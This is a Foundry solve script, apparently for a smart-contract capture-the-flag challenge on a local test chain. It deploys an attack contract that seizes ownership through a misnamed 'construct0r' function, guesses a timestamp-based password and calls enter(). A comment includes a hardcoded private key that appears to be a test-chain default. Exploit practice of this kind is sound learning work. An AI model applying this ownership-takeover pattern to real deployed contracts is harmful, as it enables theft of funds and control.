// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function construct0r() external;
    function getAllowance(uint256 _password) external;
    function createTrick() external;
    function enter() external;
    function trick() external view returns (address);
    function owner() external view returns (address);
}

interface ITrick {
    function checkPassword(uint256 _password) external returns (bool);
}

contract AttackContract {
    ITarget public target;
    
    constructor(address _target) {
        target = ITarget(_target);
    }

    function completeAttack() external payable {
        target.construct0r();

        target.createTrick();

        target.getAllowance(block.timestamp);

        payable(address(target)).transfer(0.002 ether);
        target.enter();
    }
}

contract SolveScript is Script {
    address public target = 0xBf5A316F4303e13aE92c56D2D8C9F7629bEF5c6e;
    AttackContract public attacker;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        
        // Deploy attack contract
        attacker = new AttackContract(target);
        console.log("Attack contract deployed at:", address(attacker));
        
        // Execute complete attack in one transaction
        attacker.completeAttack{value: 0.002 ether}();
        
        console.log("Attack completed successfully!");
        console.log("New owner:", ITarget(target).owner());
        
        vm.stopBroadcast();
    }
}
